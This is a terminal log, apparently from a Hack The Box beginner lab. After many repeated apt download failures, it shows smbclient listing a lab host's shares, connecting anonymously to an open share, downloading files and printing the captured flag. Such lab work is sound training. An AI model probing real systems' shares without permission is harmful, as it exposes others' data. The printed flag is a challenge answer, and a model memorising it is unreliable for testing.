+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Err:12 https://deb.parrot.sh/parrot echo/main amd64 samba amd64 2:4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+Ign:23 https://deb.parrot.sh/parrot echo/main amd64 tdb-tools amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:23 https://deb.parrot.sh/parrot echo/main amd64 tdb-tools amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Ign:23 https://deb.parrot.sh/parrot echo/main amd64 tdb-tools amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+Err:23 https://deb.parrot.sh/parrot echo/main amd64 tdb-tools amd64 2:1.4.13+samba4.22.10+dfsg-0+deb13u1
+  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libtalloc2_2.4.3%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libtevent0t64_0.16.2%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libsmbclient0_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/smbclient_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-dsdb-modules_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/python3-samba_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-common-bin_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/python3-ldb_2.11.0%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libldb2_2.11.0%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-libs_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-ad-provision_4.22.10%2bdfsg-0%2bdeb13u1_all.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-ad-dc_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libpam-winbind_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/winbind_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libnss-winbind_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-common_4.22.10%2bdfsg-0%2bdeb13u1_all.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libtdb1_1.4.13%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/libwbclient0_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/python3-tdb_1.4.13%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/python3-talloc_2.4.3%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/samba-vfs-modules_4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Failed to fetch https://deb.parrot.sh/parrot/pool/main/s/samba/tdb-tools_1.4.13%2bsamba4.22.10%2bdfsg-0%2bdeb13u1_amd64.deb  Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:dead:beef). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:bad:cafe). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:3:0:1337:c0de). - connect (101: Network is unreachable) Cannot initiate the connection to deb.parrot.sh:443 (2607:f5b4:1:1c:4:0:dead:beef). - connect (101: Network is unreachable)
+E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ smbclient -L 10.129.1.12
+Password for [WORKGROUP\heems]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+SMB1 disabled -- no workgroup available
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ smbclient \\\\10.129.1.12\\ADMIN$
+Password for [WORKGROUP\heems]:
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ smbclient \\\\10.129.1.12\\C$
+Password for [WORKGROUP\heems]:
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ smbclient \\\\10.129.1.12\\WorkShares
+Password for [WORKGROUP\heems]:
+Try "help" to get a list of possible commands.
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+mkfifo         more           mput           newer          notify         
+open           posix          posix_encrypt  posix_open     posix_mkdir    
+posix_rmdir    posix_unlink   posix_whoami   print          prompt         
+put            pwd            q              queue          quit           
+readlink       rd             recurse        reget          rename         
+reput          rm             rmdir          showacls       setea          
+setmode        scopy          stat           symlink        tar            
+tarmode        timeout        translate      unlock         volume         
+vuid           wdel           logon          listconnect    showconnect    
+tcon           tdis           tid            utimes         logoff         
+..             !              
+smb: \> ls
+  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+		5114111 blocks of size 4096. 1734245 blocks available
+smb: \> cd Amy.J
+smb: \Amy.J\> ls
+  .                                   D        0  Mon Mar 29 05:08:24 2021
+  ..                                  D        0  Mon Mar 29 05:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
+
+		5114111 blocks of size 4096. 1734229 blocks available
+smb: \Amy.J\> get worknotes.txt
+getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \Amy.J\> cd ..
+smb: \> ls
+  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+		5114111 blocks of size 4096. 1734229 blocks available
+smb: \> cd James.P
+smb: \James.P\> ls
+  .                                   D        0  Thu Jun  3 04:38:03 2021
+  ..                                  D        0  Thu Jun  3 04:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
+
+		5114111 blocks of size 4096. 1734229 blocks available
+smb: \James.P\> get flag.txt
+getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \James.P\> exit
+
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ cat worknotes.txt
+- start apache server on the linux machine
+- secure the ftp server
+- setup winrm on dancing 
+┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ cat flag.txt
+5f61c10dffbc77a704d76016a22f1664┌─[us-starting-point-1-dhcp]─[10.10.14.220]─[heems@htb-kbepmpgdpw]─[~]
+└──╼ [★]$ 
+
+  # FLAG CAPTURED!
